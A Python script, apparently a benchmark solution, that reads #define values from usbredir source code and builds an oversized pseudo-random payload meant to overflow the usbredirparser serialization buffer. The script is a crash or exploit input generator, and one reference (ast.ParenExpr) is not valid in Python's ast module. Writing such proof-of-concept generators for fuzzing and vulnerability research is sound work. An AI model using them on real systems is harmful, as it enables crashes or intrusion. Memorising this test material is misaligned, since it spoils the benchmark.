import os
import re
import tarfile
import ast
from typing import Iterator, Tuple, Optional


class _SafeIntExprEval(ast.NodeVisitor):
    __slots__ = ()

    def visit(self, node):
        if isinstance(node, ast.Expression):
            return self.visit(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, bool) or not isinstance(node.value, int):
                raise ValueError("non-int constant")
            return int(node.value)
        if isinstance(node, ast.UnaryOp) and isinstance(node.op, (ast.UAdd, ast.USub, ast.Invert)):
            v = self.visit(node.operand)
            if isinstance(node.op, ast.UAdd):
                return +v
            if isinstance(node.op, ast.USub):
                return -v
            return ~v
        if isinstance(node, ast.BinOp) and isinstance(
            node.op,
            (
                ast.Add,
                ast.Sub,
                ast.Mult,
                ast.FloorDiv,
                ast.Div,
                ast.Mod,
                ast.LShift,
                ast.RShift,
                ast.BitOr,
                ast.BitAnd,
                ast.BitXor,
            ),
        ):
            a = self.visit(node.left)
            b = self.visit(node.right)
            if isinstance(node.op, ast.Add):
                return a + b
            if isinstance(node.op, ast.Sub):
                return a - b
            if isinstance(node.op, ast.Mult):
                return a * b
            if isinstance(node.op, (ast.FloorDiv, ast.Div)):
                if b == 0:
                    raise ValueError("div by zero")
                return a // b
            if isinstance(node.op, ast.Mod):
                if b == 0:
                    raise ValueError("mod by zero")
                return a % b
            if isinstance(node.op, ast.LShift):
                return a << b
            if isinstance(node.op, ast.RShift):
                return a >> b
            if isinstance(node.op, ast.BitOr):
                return a | b
            if isinstance(node.op, ast.BitAnd):
                return a & b
            if isinstance(node.op, ast.BitXor):
                return a ^ b
        if isinstance(node, ast.ParenExpr):  # pragma: no cover
            return self.visit(node.value)
        raise ValueError("unsupported expression")


def _safe_eval_int_expr(expr: str) -> int:
    expr = expr.strip()
    expr = re.sub(r"/\*.*?\*/", " ", expr, flags=re.S)
    expr = re.sub(r"//.*?$", " ", expr, flags=re.M)
    expr = re.sub(r"\b(u|ul|ull|l|ll)\b", "", expr, flags=re.I)
    expr = expr.replace("U", "").replace("L", "")
    expr = expr.strip()
    if not expr:
        raise ValueError("empty expr")
    if len(expr) > 200:
        raise ValueError("expr too long")
    if re.search(r"[^0-9a-fA-FxX\s\(\)\+\-\*\/%<>\|&\^~]", expr):
        raise ValueError("bad chars")
    tree = ast.parse(expr, mode="eval")
    return int(_SafeIntExprEval().visit(tree))


def _iter_source_texts(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if not fn.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                    continue
                p = os.path.join(root, fn)
                try:
                    with open(p, "rb") as f:
                        yield p, f.read()
                except OSError:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                n = m.name
                if not n.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    yield n, data
                except Exception:
                    continue
    except Exception:
        return


def _find_define_int(src_path: str, name: str) -> Optional[int]:
    pat = re.compile(rb"^[ \t]*#[ \t]*define[ \t]+" + re.escape(name.encode("ascii")) + rb"[ \t]+(.+)$", re.M)
    for _, data in _iter_source_texts(src_path):
        m = pat.search(data)
        if not m:
            continue
        val = m.group(1)
        val = val.split(b"//", 1)[0].strip()
        val = re.sub(rb"/\*.*?\*/", b" ", val, flags=re.S).strip()
        try:
            return _safe_eval_int_expr(val.decode("ascii", errors="ignore"))
        except Exception:
            continue
    return None


def _find_define_string_bytes(src_path: str, name_regex: str) -> Optional[bytes]:
    pat = re.compile(rb"^[ \t]*#[ \t]*define[ \t]+(" + name_regex.encode("ascii") + rb")[ \t]+(\".*?\")[ \t]*$", re.M)
    for _, data in _iter_source_texts(src_path):
        for m in pat.finditer(data):
            s = m.group(2).strip()
            if len(s) < 2 or s[:1] != b'"' or s[-1:] != b'"':
                continue
            raw = s[1:-1]
            try:
                txt = raw.decode("utf-8", errors="strict")
            except Exception:
                txt = raw.decode("latin1", errors="ignore")
            try:
                unesc = bytes(txt, "utf-8").decode("unicode_escape").encode("latin1", errors="ignore")
            except Exception:
                unesc = raw
            if unesc:
                return unesc
    return None


def _xorshift_bytes(n: int, seed: int = 0x12345678) -> bytes:
    x = seed & 0xFFFFFFFF
    out = bytearray(n)
    for i in range(n):
        x ^= ((x << 13) & 0xFFFFFFFF)
        x ^= (x >> 17)
        x ^= ((x << 5) & 0xFFFFFFFF)
        out[i] = x & 0xFF
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf_size = _find_define_int(src_path, "USBREDIRPARSER_SERIALIZE_BUF_SIZE")
        if buf_size is None or buf_size <= 0 or buf_size > 8 * 1024 * 1024:
            buf_size = 64 * 1024

        version = None
        for name in (
            "USBREDIRPARSER_SERIALIZE_VERSION",
            "USBREDIRPARSER_SERIALIZER_VERSION",
            "USBREDIRPARSER_MIGRATION_VERSION",
            "USBREDIRPARSER_STATE_VERSION",
        ):
            v = _find_define_int(src_path, name)
            if v is not None and 0 <= v <= 0xFFFFFFFF:
                version = v
                break
        if version is None:
            version = 1

        magic = _find_define_string_bytes(src_path, r".*SERIALIZE.*MAGIC.*|.*MIGRATION.*MAGIC.*|.*STATE.*MAGIC.*")
        extra = 4096
        target_len = buf_size + extra
        if target_len < 66000:
            target_len = 66000
        if target_len > 200000:
            target_len = min(buf_size + 8192, 200000)

        payload = bytearray(_xorshift_bytes(target_len, seed=0xC0FFEE42))

        if magic:
            m = magic[: min(len(magic), len(payload))]
            payload[: len(m)] = m

        payload[0:4] = int(version & 0xFFFFFFFF).to_bytes(4, "little", signed=False)
        return bytes(payload)